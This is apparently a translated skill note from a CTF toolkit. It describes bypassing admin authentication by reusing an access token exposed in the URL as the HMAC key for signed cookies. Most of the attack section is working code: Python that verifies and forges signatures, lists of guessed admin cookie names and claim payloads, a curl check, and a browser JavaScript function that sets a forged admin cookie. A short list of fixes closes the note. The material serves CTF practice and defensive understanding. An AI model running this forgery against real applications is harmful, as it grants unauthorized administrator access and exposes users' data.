# Cookie HMAC key reuse → background authentication bypass

> When the server uses the access token exposed in the URL as the cookie signing key, and the background directly trusts the claim field in the cookie payload, the administrator's identity can be forged.

---

## Applicable scenarios

- The target is a web application, and the URL path contains parameters such as`access_token`/`token`/`key`
- The response header sets a signed cookie (such as`student_gate=<payload>.<signature>`)
- There is a possibility that multiple signed cookies (student side + management side) share a key
- The background cookie payload contains client-controllable permission statements (such as`{"admin":true}`)

## keywords

- HMAC key reuse/signature key reuse
- Known-key session forgery / known key session forgery
- Client-side claims-based auth / client-side declarative permissions
- Cookie signature bypass / Cookie signature bypass

## Attack process

### Step 1: Extract access token from URL

Typically found in the entry URL:

```
/access/blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

Extract token:

```
blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

### Step 2: Observe student_gate Cookie

When accessing the portal, a signed cookie will be set in the response header. The format is usually:

```
Set-Cookie: <name>=<base64url(payload)>.<base64url(signature)>
```

Decode the payload to confirm the content structure.

### Step 3: Verify signature algorithm

Using a known access token as the HMAC key, try to reproduce the signature:

```python
import hmac, hashlib, base64

access_token = "token extracted from the URL"
payload_b64 = "payload portion extracted from the cookie"
expected_sig = "signature portion extracted from the cookie"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

computed = b64url(hmac.new(
    access_token.encode(),
    payload_b64.encode(),
    hashlib.sha256
).digest())

print("Match" if computed == expected_sig else "No match")
```

If matched → confirm that `the access token is the HMAC key`.

### Step 4: Guess the management cookie name and payload structure

Common management cookie names:

- `admin_session`
- `admin_token`
- `admin_auth`
- `manage_token`
- `backstage_session`

Payload structure test direction (try one by one until hitting 200):

```json
{"admin":true}
{"role":"admin"}
{"isAdmin":true}
{"access":"admin"}
{"level":"admin"}
{"user":"admin"}
{"authenticated":true}
{"type":"admin"}
```

### Step 5: Forge management cookies

```python
import hmac, hashlib, json, base64

access_token = "known token"
payload = {"admin": True}

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
sig = b64url(hmac.new(
    access_token.encode(), payload_b64.encode(), hashlib.sha256
).digest())

cookie = f"admin_session={payload_b64}.{sig}"
print(cookie)
```

### Step 6: Verify background permissions

```bash
curl -k -H "Cookie: <cookie obtained in the previous step>" https://target/api/admin/me
```

Return`{"admin":true}`or 200 + administrator data on success.

## Browser recurrence

```javascript
async function exploit() {
  const token = location.pathname.split('/access/')[1];
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey('raw', enc.encode(token),
    { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const payload = btoa('{"admin":true}').replace(/=/g, '');
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(payload));
  const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig)))
    .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  document.cookie = `admin_session=${payload}.${sigB64}; path=/; Secure`;
  location.reload();
}
exploit();
```

## Fix

1. Use server-side independent key to sign cookies, not shared with URL token
2. Background permissions are based on the server session, not the client Cookie payload statement
3. Different roles use different signing keys
4. Add statements such as`iat`/`exp`/`typ`to the cookie and verify them
5. Silently handle signature parsing exceptions (return 401 on failure, do not return 500)

## Related cases

- class.pangbaoba.me CTF shooting range background bypass (student_gate and admin_session share access token as HMAC key,`{"admin":true}`directly obtains administrator rights)

## Related skills

- `CTF-Sandbox-Orchestrator/competition-web-runtime/SKILL.md`— Web runtime analysis
- `CTF-Sandbox-Orchestrator/competition-jwt-claim-confusion/SKILL.md`— Similar token declaration obfuscation
- `reverse-engineering/languages-platforms.md`— JWT / OAuth related
